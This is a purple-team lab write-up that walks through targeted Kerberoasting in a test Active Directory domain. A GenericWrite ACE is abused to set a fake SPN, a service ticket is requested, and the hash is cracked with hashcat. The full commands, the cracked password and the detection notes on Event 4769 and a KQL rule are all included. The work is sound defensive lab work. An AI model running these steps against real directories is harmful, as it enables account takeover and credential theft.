# Phase 03: On-Prem Attacks — Attack #3: ACL/DACL Abuse

**Technique:** ACL/DACL Abuse — Targeted Kerberoasting via GenericWrite
**MITRE ATT&CK:** T1222.001 (File and Directory Permissions Modification) + T1558.003 (Kerberoasting)
**Privilege required:** Any domain user with a misconfigured ACE on a target object
**Tools used:** impacket-getTGT, bloodyAD, impacket-GetUserSPNs, hashcat
**Account abused:** john.smith (GenericWrite ACE over sarah.jones)
**Outcome:** sarah.jones's password recovered via targeted Kerberoasting enabled by one misconfigured ACE

---

## What ACL/DACL Abuse Is

Every AD object has a DACL (Discretionary Access Control List) — a list of ACEs (Access Control Entries) defining who can do what to that object. ACL abuse exploits wrong ACEs: permissions granted to accounts that should never have them. Not a CVE, not a software bug — a human misconfiguration that accumulates silently over years.

GenericWrite on a user object allows writing to any non-protected attribute. On sarah.jones, this opened three attack paths:

1. **Targeted Kerberoasting** — set a fake SPN, request her service ticket, crack her password offline (demonstrated)
2. **Logon script hijack** — modify `scriptPath` to point at attacker-controlled content
3. **Shadow Credentials** — write to `msDS-KeyCredentialLink`, authenticate as her via certificate without knowing her password

---

## The Misconfiguration

Set in Phase 02 — john.smith has GenericWrite over sarah.jones:

| Property | Value |
|---|---|
| Principal | john.smith |
| Target | sarah.jones (CN=Sarah Jones,OU=Accounts,OU=Tier2,OU=KaveeLab,DC=kaveelab,DC=internal) |
| Permission | GenericWrite (Write all properties) |
| Type | Allow |
| Inherited From | None — explicit ACE |
| Applies to | This object only |

---

## BloodHound — Tool Context

BloodHound maps every AD permission as a graph edge and automatically finds attack paths. It would have drawn `john.smith → GenericWrite → sarah.jones` as a visual edge and shown all paths from john.smith to Domain Admin that flow through that edge.

BloodHound CE installation was attempted but failed due to PostgreSQL 18 compatibility issues with the CE container stack. Legacy BloodHound also had bhapi service startup issues. Since the attack path was already known (we set it up in Phase 02), BloodHound was not required to execute the attack. Will be revisited as a standalone session before Attack #4.

---

## The Attack — Step by Step

### Step 1 — Get a Kerberos ticket for john.smith

```bash
impacket-getTGT kaveelab.internal/john.smith:'Password123!' -dc-ip 192.168.112.10
```

Required because WS2025 enforces LDAP signing. Plain LDAP modifications fail with `strongerAuthRequired`. LDAPS (port 636) also failed — DC01 has no SSL certificate installed (AD CS not yet deployed). Kerberos authentication handles signing automatically through the ticket mechanism without needing a certificate.

Output: `john.smith.ccache` — john.smith's TGT saved to disk.

### Step 2 — Set a fake SPN on sarah.jones via GenericWrite

```bash
KRB5CCNAME=john.smith.ccache bloodyAD \
    -u john.smith \
    -d kaveelab.internal \
    --host dc01.kaveelab.internal \
    -k \
    set object sarah.jones servicePrincipalName -v 'HTTP/fake.kaveelab.internal'
```

`KRB5CCNAME` — environment variable telling Kerberos-aware tools where to find the credential cache file. bloodyAD reads john.smith's TGT from it.

`-k` — Kerberos authentication mode. Uses the cached ticket instead of a password.

`--host dc01.kaveelab.internal` — hostname required (not IP) when using Kerberos. The ticket is issued for a specific hostname; IP addresses don't match.

`set object sarah.jones servicePrincipalName -v 'HTTP/fake.kaveelab.internal'` — writes the fake SPN to sarah.jones's `servicePrincipalName` attribute. DC01 checks john.smith's ACE, finds GenericWrite, accepts the write.

Output: `[+] sarah.jones's servicePrincipalName has been updated`

### Step 3 — Kerberoast sarah.jones

```bash
impacket-GetUserSPNs kaveelab.internal/john.smith:'Password123!' \
    -dc-ip 192.168.112.10 \
    -request \
    -outputfile /tmp/acl_kerberoast.txt
```

Identical to Attack #1. sarah.jones now appears in the SPN enumeration alongside svc.http and svc.sql — a regular HR user listed as a Kerberoasting target because of a fake SPN set via a misconfigured ACE.

Output showed:
```
HTTP/fake.kaveelab.internal    sarah.jones    MemberOf: GG-HR    PasswordLastSet: 2026-08-18    LastLogon: <never>
```

### Step 4 — Crack the hash (Windows host)

Same GPU passthrough limitation as previous attacks — cracked on Windows host:

```cmd
.\hashcat.exe -m 19700 sarahjones.txt passwords.txt
```

Result:
```
Status: Cracked
Recovered: 1/1
sarah.jones:Password123!
```

### Step 5 — Cleanup

```powershell
Set-ADUser -Identity sarah.jones -ServicePrincipalNames @{Remove="HTTP/fake.kaveelab.internal"}
```

Verified empty ServicePrincipalNames after removal.

---

## Issues Encountered

**LDAPS SSL failure:** DC01 has no LDAPS certificate — AD CS not deployed yet. Fix: Kerberos auth (`-k`) instead of LDAPS (`-s`).

**bloodyAD syntax changed in v2.5.5:** `setAttribute` renamed to `set object`. Value requires `-v` flag. `--host` requires hostname not IP when using Kerberos.

**5136 not firing:** default user object SACLs don't audit `servicePrincipalName` attribute modifications. Requires per-attribute SACL ACEs configured on the OU. Detection gap — noted for Phase 07 hardening.

---

## What DC01 Logged — Event ID 4769

| Field | Value | Significance |
|---|---|---|
| TargetUserName | john.smith | The attacker — helpdesk user |
| ServiceName | sarah.jones | User account as service target — the anomaly |
| TicketEncryptionType | 0x12 (AES256) | Normal for WS2025 |
| IpAddress | 192.168.112.138 | ATTACKER01 confirmed |

`ServiceName: sarah.jones` is the detection field. In normal Kerberos traffic, service ticket requests target service accounts or machine accounts — never a regular user account. A 4769 where ServiceName is a user account is an immediate indicator of targeted Kerberoasting via ACL abuse.

---

## KQL Detection Rule

Stored at `scripts/kql-acl-abuse.kql`. Tests in Microsoft Sentinel in Phase 07.

Detection logic: Event 4769 where ServiceName is a user account (not a machine account, not krbtgt, not a known service account). This specific pattern — a user account appearing as a Kerberos service target — indicates a fake SPN was set on that account by an attacker abusing a write permission.

---

## What the Attack Enabled

Starting position: john.smith has one credential, zero admin rights.
End position: sarah.jones's password (`Password123!`) recovered, full authentication as sarah.jones possible.

The chain: one misconfigured ACE → fake SPN written → Kerberos service ticket issued → hash cracked offline → HR user account compromised. Total time: under two minutes from starting bloodyAD to cracked password.

---

## Purple Team Loop

| Step | Status |
|---|---|
| GenericWrite ACE confirmed | ✅ |
| Kerberos ticket obtained for john.smith | ✅ |
| Fake SPN set on sarah.jones via bloodyAD | ✅ |
| sarah.jones appeared in SPN enumeration | ✅ |
| AES256 TGS hash captured | ✅ |
| Hash cracked — Password123! | ✅ |
| Event 4769 confirmed — ServiceName: sarah.jones | ✅ |
| KQL detection rule written | ✅ |
| Event 5136 detection | ⏳ Requires SACL hardening — Phase 07 |
| KQL tested in Sentinel | ⏳ Phase 07 |
| Fake SPN removed from sarah.jones | ✅ |
